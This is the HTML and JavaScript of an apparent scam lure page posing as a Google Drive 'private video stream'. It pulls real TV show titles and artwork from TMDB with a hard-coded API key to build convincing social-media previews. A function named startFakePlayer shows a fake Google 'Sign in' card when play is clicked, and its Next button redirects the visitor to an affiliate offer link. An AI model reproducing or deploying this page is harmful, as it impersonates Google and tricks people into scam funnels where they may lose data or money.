<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title id="page-title">Loading Access...</title>
    
    <meta property="og:site_name" content="FILE-TV.RF.GD">
    <meta property="og:title" id="og-title" content="[DIRECT ACCESS] Private Video Stream">
    <meta property="og:description" id="og-description" content="Identity verification required. Encrypted 1080p streaming enabled.">
    
    <meta property="og:image" id="og-image" content=""> 
    <meta property="og:image:width" content="1280">
    <meta property="og:image:height" content="720">
    <meta property="og:type" content="video.other">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" id="twitter-title" content="[DIRECT ACCESS] Exclusive Video">
    <meta name="twitter:image" id="twitter-image" content="">

    <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --drive-bg: #0d0d0d; 
            --header-bg: #1a1b1c; 
            --google-blue: #8ab4f8; 
            --btn-blue: #1a73e8;
            --gray-text: #9aa0a6;
            --folder-bg: #1e1f21;
            --border: #3c4043;
            --text-main: #e8eaed;
            --card-shadow: rgba(0,0,0,0.5);
        }
        [data-theme="light"] {
            --drive-bg: #f8f9fa;
            --header-bg: #ffffff; 
            --google-blue: #1a73e8; 
            --btn-blue: #1a73e8;
            --gray-text: #5f6368;
            --folder-bg: #ffffff;
            --border: #dadce0;
            --text-main: #3c4043;
            --card-shadow: rgba(0,0,0,0.1);
        }
        * { margin:0; padding:0; box-sizing: border-box; transition: background 0.3s, color 0.3s; }
        body { background: var(--drive-bg); color: var(--text-main); font-family: 'Roboto', sans-serif; overflow-x: hidden; }
        .g-header { position: fixed; top: 0; width: 100%; height: 64px; background: var(--header-bg); display: flex; align-items: center; padding: 0 16px; z-index: 2000; border-bottom: 1px solid var(--border); }
        .h-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
        .file-name { font-size: 17px; font-weight: 400; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .main-container { padding-top: 85px; display: flex; flex-direction: column; align-items: center; }
        .player-wrapper { width: 94%; max-width: 900px; aspect-ratio: 16/9; background: #000; border-radius: 12px; position: relative; overflow: hidden; cursor: pointer; box-shadow: 0 10px 30px var(--card-shadow); margin-bottom: 25px; }
        #backdrop { position: absolute; inset: 0; background-size: cover; background-position: center; opacity: 0.6; }
        .overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10; }
        .play-btn { width: 70px; height: 70px; background: rgba(255,255,255,0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .play-btn i { color: #202124; font-size: 26px; margin-left: 5px; }
        .list-section { width: 92%; max-width: 900px; }
        .folder-box { background: var(--folder-bg); padding: 15px 18px; border-radius: 10px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; cursor: pointer; margin-bottom: 12px; }
        .folder-content { display: flex; align-items: center; gap: 15px; }
        .folder-content i { color: #fabb05; font-size: 22px; }
        .dropdown-list { display: none; background: var(--folder-bg); border: 1px solid var(--border); border-radius: 10px; margin-top: -8px; margin-bottom: 20px; overflow-y: auto; max-height: 280px; }
        .item-opt { display: flex; align-items: center; gap: 12px; padding: 14px 18px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border); font-size: 14px; }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.75); z-index: 9999; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .google-card { background: #fff; width: 92%; max-width: 420px; padding: 45px 35px; border-radius: 8px; text-align: center; color: #202124; }
        .next-btn { background: #1a73e8; color: #fff; padding: 10px 26px; border-radius: 4px; border: none; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 30px; }
    </style>
</head>
<body data-theme="dark">

<nav class="g-header">
    <div class="h-left">
        <div class="h-icon" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
        <div class="file-name" id="h-title">Loading...</div>
    </div>
</nav>

<div class="main-container">
    <div class="player-wrapper" onclick="startFakePlayer()">
        <div id="backdrop"></div>
        <div class="overlay">
            <div class="play-btn" id="play-ui"><i class="fas fa-play"></i></div>
        </div>
    </div>

    <div class="list-section">
        <div class="folder-box" onclick="toggleDD('s-dropdown')">
            <div class="folder-content"><i class="fas fa-folder"></i> <span id="selected-season-text">Season 1</span></div>
            <i class="fas fa-chevron-down"></i>
        </div>
        <div class="dropdown-list" id="s-dropdown"></div>

        <div class="folder-box" onclick="toggleDD('e-dropdown')">
            <div class="folder-content"><i class="fas fa-file-video" style="color:#ea4335"></i> <span id="selected-episode-text">Episode 1</span></div>
            <i class="fas fa-chevron-down"></i>
        </div>
        <div class="dropdown-list" id="e-dropdown"></div>
    </div>
</div>

<div class="modal-overlay" id="loginModal">
    <div class="google-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom:15px">
        <h1 style="font-size:22px; font-weight:400;">Sign in</h1>
        <p style="margin-bottom:30px; color: #5f6368;">to continue to Google Drive</p>
        <button class="next-btn" onclick="goToLink()">Next</button>
    </div>
</div>

<script>
    const API_KEY = "22be462e6d3de1dbab03d1ca50847b5a";
    const params = new URLSearchParams(window.location.search);
    let tvID = params.get('id') || '65701'; // Default: Good Mythical Morning
    let sNum = parseInt(params.get('s')) || 1;
    let eNum = parseInt(params.get('e')) || 1;

    async function loadTV() {
        try {
            // Ambil data TV utama
            const r = await fetch(`https://api.themoviedb.org/3/tv/${tvID}?api_key=${API_KEY}`);
            const data = await r.json();
            
            // Ambil data Episode untuk mendapatkan Backdrop Spesifik Episode
            const rs = await fetch(`https://api.themoviedb.org/3/tv/${tvID}/season/${sNum}?api_key=${API_KEY}`);
            const sData = await rs.json();
            const activeEp = sData.episodes.find(ep => ep.episode_number == eNum) || sData.episodes[0];
            
            // URL Gambar Backdrop Asli (Prioritas: Gambar Episode -> Jika tidak ada -> Gambar TV)
            const backdropURL = `https://image.tmdb.org/t/p/w1280${activeEp.still_path || data.backdrop_path}`;
            
            // --- UPDATE META OG SECARA DINAMIS (BACKDROP ASLI) ---
            const fullTitle = `[DIRECT ACCESS] ${data.name} S${sNum} E${eNum} - Watch Full HD`;
            
            document.getElementById('og-title').setAttribute('content', fullTitle);
            document.getElementById('twitter-title').setAttribute('content', fullTitle);
            document.getElementById('og-image').setAttribute('content', backdropURL);
            document.getElementById('twitter-image').setAttribute('content', backdropURL);
            
            // Update UI Halaman
            document.getElementById('h-title').innerText = `${data.name}_S${sNum}_E${eNum}.mp4`;
            document.getElementById('backdrop').style.backgroundImage = `url(${backdropURL})`;
            document.getElementById('selected-season-text').innerText = `Season ${sNum}`;
            document.getElementById('selected-episode-text').innerText = `E${eNum} - ${activeEp.name}`;

            // List Dropdown (Season & Episode)
            const sDD = document.getElementById('s-dropdown');
            for(let i=1; i<=data.number_of_seasons; i++) {
                sDD.innerHTML += `<a href="?id=${tvID}&s=${i}&e=1" class="item-opt">Season ${i}</a>`;
            }
            const eDD = document.getElementById('e-dropdown');
            eDD.innerHTML = sData.episodes.map(ep => `<a href="?id=${tvID}&s=${sNum}&e=${ep.episode_number}" class="item-opt">E${ep.episode_number} - ${ep.name}</a>`).join('');

        } catch (e) { console.error(e); }
    }

    function toggleDD(id) {
        const el = document.getElementById(id);
        el.style.display = (el.style.display === 'block') ? 'none' : 'block';
    }

    function startFakePlayer() { showLogin(); }
    function showLogin() { document.getElementById('loginModal').style.display = 'flex'; }
    function goToLink() { window.location.href = "https://playfloowz.com/c?a=275&o=19&sub2=tv_preview"; }

    loadTV();
</script>
</body>
</html>
